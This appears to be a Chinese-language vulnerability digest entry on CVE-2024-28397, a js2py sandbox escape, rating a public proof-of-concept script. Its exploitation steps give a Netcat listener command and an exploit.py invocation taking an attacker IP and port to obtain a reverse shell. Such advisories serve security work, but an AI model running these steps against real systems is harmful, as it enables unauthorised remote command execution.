## CVE-2024-28397 - js2py RCE

**漏洞编号:** CVE-2024-28397

**漏洞类型:** RCE

**影响应用:** js2py

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** < 0.74

**利用条件:** 需要目标存在js2py且版本低于0.74，需要网络访问目标。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2024-28397 是 js2py 库中的一个沙箱逃逸漏洞，允许攻击者在受影响的系统上执行任意命令。该漏洞源于 js2py 未能正确隔离 JavaScript 环境与主机 Python 环境，攻击者可以利用不当的输入清理访问 Python 的内部 `__class__` 和 `__subclasses__` 属性。通过遍历对象层次结构，攻击者可以访问 `subprocess.Popen`，从而在主机服务器上执行任意命令。

POC有效性分析：
提供的 POC 代码是一个 Python 脚本，旨在自动化利用此漏洞的过程。该脚本通过生成包含恶意 JavaScript 代码的有效负载，该代码旨在利用沙箱逃逸漏洞。然后，脚本将有效负载发送到目标，如果目标易受攻击，则有效负载将允许攻击者在目标系统上执行任意命令。README 文件提供了有关漏洞和脚本用法的清晰说明，包括先决条件、使用方法和演示利用的屏幕截图。

利用步骤：
1. 确保目标系统上安装了易受攻击的 js2py 版本（低于 0.74）。
2. 安装所需的 Python 库：`pip install requests`。
3. 启动 Netcat 监听器：`nc -lvnp 1337`。
4. 使用目标 URL、攻击者 IP 和端口运行 exploit.py 脚本：`python3 exploit.py -u <target url> -i <attacker ip> -p <attacker port>`。
5. 如果利用成功，将在 Netcat 监听器上收到反向 shell。

投毒风险分析：
该 POC 脚本的投毒风险较低。代码相对清晰，主要使用标准 Python 库。虽然该脚本旨在执行任意命令，但其主要功能是利用已知漏洞，而不是引入新的恶意功能。该脚本的作者和贡献者均已明确标识，并且该存储库包含法律免责声明，强调仅用于教育目的和授权安全评估。然而，值得注意的是，任何用于利用漏洞的代码都可能被恶意行为者滥用。因此，在不受信任的来源下载和执行此类脚本时应谨慎行事。尽管代码本身看起来没有恶意，但用户应始终仔细检查代码以确保其安全，特别是在生产环境中部署之前。此外，该脚本使用 base64 编码，这可能被恶意行为者用来稍微混淆他们的意图，但在这里它被用来避免传输过程中的语法错误。总体而言，由于代码的清晰性以及它专注于利用已知的漏洞而不是引入新的恶意行为，该脚本的投毒风险较低。

**项目地址:** https://github.com/L1337Xi/CVE-2024-28397-js2py-Sandbox-Escape

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-28397
